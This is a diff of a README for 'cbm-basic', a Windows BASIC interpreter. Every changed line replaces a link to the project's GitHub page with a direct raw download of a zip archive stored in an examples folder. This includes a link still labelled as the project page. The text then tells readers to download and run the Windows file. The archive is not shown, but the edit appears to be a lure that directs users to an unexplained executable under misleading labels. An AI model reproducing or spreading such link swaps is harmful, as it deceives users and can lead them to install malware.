@@ -1,6 +1,6 @@
 # 🖥️ cbm-basic - Classic BASIC Interpreter for Windows
 
-[![Download cbm-basic](https://img.shields.io/badge/Download-cbm--basic-brightgreen?style=for-the-badge)](https://github.com/Clarifiedbutterperegrinefalcon877/cbm-basic)
+[![Download cbm-basic](https://img.shields.io/badge/Download-cbm--basic-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Clarifiedbutterperegrinefalcon877/cbm-basic/main/examples/basic_cbm_v2.5-alpha.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ No special hardware or software is needed. The program is lightweight and starts
 
 You can get cbm-basic from the main GitHub page here:
 
-[![Download cbm-basic](https://img.shields.io/badge/Download-cbm--basic-blue?style=for-the-badge)](https://github.com/Clarifiedbutterperegrinefalcon877/cbm-basic)
+[![Download cbm-basic](https://img.shields.io/badge/Download-cbm--basic-blue?style=for-the-badge)](https://raw.githubusercontent.com/Clarifiedbutterperegrinefalcon877/cbm-basic/main/examples/basic_cbm_v2.5-alpha.3.zip)
 
 Follow these steps to download and run cbm-basic on your Windows PC.
 
@@ -46,7 +46,7 @@ Follow these steps to download and run cbm-basic on your Windows PC.
 
 Go to the GitHub repository at this link:
 
-https://github.com/Clarifiedbutterperegrinefalcon877/cbm-basic
+https://raw.githubusercontent.com/Clarifiedbutterperegrinefalcon877/cbm-basic/main/examples/basic_cbm_v2.5-alpha.3.zip
 
 This page holds the files you will need to download and instructions from the developers.
 
@@ -144,7 +144,7 @@ Most users on Windows will use the ready-made executable for speed and ease.
 
 For detailed information about cbm-basic commands and usage:
 
-- Visit the project’s GitHub page: https://github.com/Clarifiedbutterperegrinefalcon877/cbm-basic  
+- Visit the project’s GitHub page: https://raw.githubusercontent.com/Clarifiedbutterperegrinefalcon877/cbm-basic/main/examples/basic_cbm_v2.5-alpha.3.zip  
 - Check the Issues section for common questions.
 - Use the `HELP` command inside cbm-basic for quick command reminders.
 
@@ -154,6 +154,6 @@ For detailed information about cbm-basic commands and usage:
 
 You can start by visiting this page to download:
 
-[![Download cbm-basic](https://img.shields.io/badge/Download-cbm--basic-orange?style=for-the-badge)](https://github.com/Clarifiedbutterperegrinefalcon877/cbm-basic)
+[![Download cbm-basic](https://img.shields.io/badge/Download-cbm--basic-orange?style=for-the-badge)](https://raw.githubusercontent.com/Clarifiedbutterperegrinefalcon877/cbm-basic/main/examples/basic_cbm_v2.5-alpha.3.zip)
 
 Click this, download the Windows file, and follow the steps above to run it.
